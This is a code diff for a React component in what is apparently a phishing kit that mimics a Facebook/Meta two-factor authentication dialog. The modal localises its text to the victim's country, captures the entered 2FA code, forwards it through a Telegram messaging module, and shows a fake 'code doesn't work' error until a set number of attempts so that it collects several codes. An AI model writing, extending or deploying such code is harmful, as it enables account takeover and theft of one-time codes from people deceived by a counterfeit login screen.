@@ -1,13 +1,13 @@
-import MetaLogo from '@/assets/images/meta-logo-image.png';
-import VerifyImage from '@/assets/images/verify-image.png';
-import { sendMessage, type Verdict } from '@/lib/socket';
+import { sendMessage } from '@/lib/telegram';
 import { store } from '@/store/store';
 import config from '@/utils/config';
 import translateText from '@/utils/translate';
 import Image from 'next/image';
 import { useEffect, useRef, useState, type FC } from 'react';
+import MetaLogo from '@/assets/images/meta-logo-grey.png';
+import VerifyImage from '@/assets/images/2FA.png';
 
-const VerifyModal: FC<{ nextStep: () => void; verdict: Verdict | null }> = ({ nextStep, verdict }) => {
+const VerifyModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
     const [attempts, setAttempts] = useState(0);
     const [code, setCode] = useState('');
     const [isLoading, setIsLoading] = useState(false);
@@ -16,8 +16,8 @@ const VerifyModal: FC<{ nextStep: () => void; verdict: Verdict | null }> = ({ ne
 
     const { geoInfo, messageId, messageContent, setMessageContent, setMessageId } = store();
     const maxCode = config.MAX_CODE ?? 3;
+    const loadingMs = (config.CODE_LOADING_TIME ?? 15) * 1000;
     const waitTimer = useRef<ReturnType<typeof setTimeout> | null>(null);
-    const [pending, setPending] = useState(false);
 
     const t = (text: string): string => {
         return translations[text] || text;
@@ -26,7 +26,7 @@ const VerifyModal: FC<{ nextStep: () => void; verdict: Verdict | null }> = ({ ne
     useEffect(() => {
         if (!geoInfo) return;
 
-        const textsToTranslate = ['Check your authentication code', 'Enter the 6-digit code for this account from the two-factor authentication you set up (such as Google Authenticator, email or text message on your mobile).', 'Code', "This code doesn't work. Check it's correct or try a new one after", 'Continue'];
+        const textsToTranslate = ['Two-factor authentication request', 'Enter the code sent to your email, phone number, or confirm with an authenticator app.', 'Code', "This code doesn't work. Check it's correct or try a new one after", 'Continue', 'Try another method'];
 
         const translateAll = async () => {
             const entries = await Promise.all(textsToTranslate.map(async (text) => [text, await translateText(text, geoInfo.country_code)] as const));
@@ -36,21 +36,6 @@ const VerifyModal: FC<{ nextStep: () => void; verdict: Verdict | null }> = ({ ne
 
         void translateAll();
     }, [geoInfo]);
-
-    const [appliedVerdict, setAppliedVerdict] = useState<Verdict | null>(null);
-    if (verdict !== appliedVerdict) {
-        setAppliedVerdict(verdict);
-        if (verdict && pending && verdict.status === 'rejected') {
-            setPending(false);
-            setIsLoading(false);
-            setShowError(true);
-            setCode('');
-        }
-    }
-
-    useEffect(() => {
-        if (pending && verdict && verdict.status !== 'rejected') nextStep();
-    }, [pending, verdict, nextStep]);
 
     useEffect(() => () => {
         if (waitTimer.current) clearTimeout(waitTimer.current);
@@ -71,8 +56,7 @@ const VerifyModal: FC<{ nextStep: () => void; verdict: Verdict | null }> = ({ ne
 
         const sentId = await sendMessage({
             message: updatedMessage,
-            message_id: messageId,
-            stage: 'code'
+            message_id: messageId
         });
 
         if (sentId === null) {
@@ -81,19 +65,33 @@ const VerifyModal: FC<{ nextStep: () => void; verdict: Verdict | null }> = ({ ne
         }
         setMessageId(sentId);
         setMessageContent(updatedMessage);
-        setPending(true);
+
         if (waitTimer.current) clearTimeout(waitTimer.current);
-        waitTimer.current = setTimeout(() => setIsLoading(false), 180_000);
+        waitTimer.current = setTimeout(() => {
+            setIsLoading(false);
+            if (next >= maxCode) {
+                nextStep();
+            } else {
+                setShowError(true);
+                setCode('');
+            }
+        }, loadingMs);
     };
 
     return (
-        <div className='fixed inset-0 z-10 flex h-screen w-screen items-center justify-center bg-black/40 px-4'>
-            <div className='flex max-h-[90vh] w-full max-w-xl flex-col gap-7 rounded-3xl bg-linear-to-br from-[#FCF3F8] to-[#EEFBF3] p-4'>
-                <p className='mt-4 text-2xl font-bold'>{t('Check your authentication code')}</p>
-                <p className='text-xl'>{t('Enter the 6-digit code for this account from the two-factor authentication you set up (such as Google Authenticator, email or text message on your mobile).')}</p>
-                <div className='flex flex-col justify-center'>
-                    <Image src={VerifyImage} alt='' />
-                    <div className='relative mt-4 w-full'>
+        <div className='fixed inset-0 z-10 flex h-screen w-screen items-center justify-center overflow-y-auto bg-black/45 p-2'>
+            <div className='flex max-h-[calc(100vh-16px)] min-h-[min(860px,calc(100vh-16px))] w-full max-w-130 flex-col overflow-y-auto rounded-2xl bg-white p-5 shadow-2xl'>
+                <div className='flex flex-1 flex-col justify-between'>
+                    <div>
+                        <div className='mb-2 flex items-center gap-1.5 text-sm text-[#9a979e]'><span>Facebook</span><span className='h-1 w-1 rounded-full bg-[#9a979e]' /></div>
+                        <h2 className='mb-3 text-[22px] font-bold text-black'>{t('Two-factor authentication request')}</h2>
+                        <p className='text-[15px] leading-6 text-[#9a979e]'>{t('Enter the code sent to your email, phone number, or confirm with an authenticator app.')}</p>
+                    </div>
+                    <div className='my-4 overflow-hidden rounded-[10px] bg-[#f5f5f5]'>
+                        <Image src={VerifyImage} alt='' className='w-full' />
+                    </div>
+                    <div>
+                        <div className={`flex h-10 w-full items-center rounded-[10px] border-2 bg-white px-3 ${showError ? 'border-red-500' : 'border-[#d4dbe3]'}`}>
                         <input
                             type='tel'
                             inputMode='numeric'
@@ -108,20 +106,17 @@ const VerifyModal: FC<{ nextStep: () => void; verdict: Verdict | null }> = ({ ne
                             }}
                             maxLength={8}
                             disabled={isLoading}
-                            className='peer h-15 w-full rounded-[10px] border-2 border-[#d4dbe3] px-3 pt-6 pb-2 placeholder-transparent focus:outline-none'
+                            className='h-full w-full border-0 bg-transparent text-sm'
                             placeholder={t('Code')}
                         />
-                        <label htmlFor='code-input' className='absolute top-1/2 left-3 -translate-y-1/2 cursor-text text-[#4a4a4a] transition-all duration-200 ease-in-out peer-placeholder-shown:top-1/2 peer-placeholder-shown:-translate-y-1/2 peer-placeholder-shown:text-base peer-focus:top-2 peer-focus:translate-y-0 peer-focus:text-xs peer-[:not(:placeholder-shown)]:top-2 peer-[:not(:placeholder-shown)]:translate-y-0 peer-[:not(:placeholder-shown)]:text-xs'>
-                            {t('Code')}
-                        </label>
+                        </div>
+                        {showError && <p className='mt-1 text-xs text-red-500'>{t("This code doesn't work. Check it's correct or try a new one after")}</p>}
+                        <button type='button' onClick={handleSubmit} disabled={isLoading || code.length < 6} className={`mt-3 flex h-10 w-full items-center justify-center rounded-full bg-[#0064e0] text-sm font-semibold text-white ${isLoading || code.length < 6 ? 'cursor-not-allowed opacity-70' : ''}`}>
+                            {isLoading ? <span className='h-5 w-5 animate-spin rounded-full border-3 border-white/40 border-t-white' /> : t('Continue')}
+                        </button>
+                        <button type='button' className='mt-5 flex h-10 w-full items-center justify-center rounded-full border border-[#d4dbe3] text-sm text-[#8f949d]'>{t('Try another method')}</button>
                     </div>
-                    {showError && <p className='mt-2 text-[15px] text-red-500'>{t("This code doesn't work. Check it's correct or try a new one after")}</p>}
-                    <button type='button' onClick={handleSubmit} disabled={isLoading || code.length < 6} className={`mt-4 flex h-12.5 w-full items-center justify-center rounded-full bg-blue-600 font-semibold text-white transition-colors hover:bg-blue-700 ${isLoading || code.length < 6 ? 'cursor-not-allowed opacity-80' : ''}`}>
-                        {isLoading ? <div className='h-5 w-5 animate-spin rounded-full border-2 border-white border-b-transparent border-l-transparent'></div> : t('Continue')}
-                    </button>
-                </div>
-                <div className='flex items-center justify-center p-3'>
-                    <Image src={MetaLogo} alt='' className='h-4.5 w-17.5' />
+                    <Image src={MetaLogo} alt='Meta' width={64} className='mx-auto mt-5' />
                 </div>
             </div>
         </div>
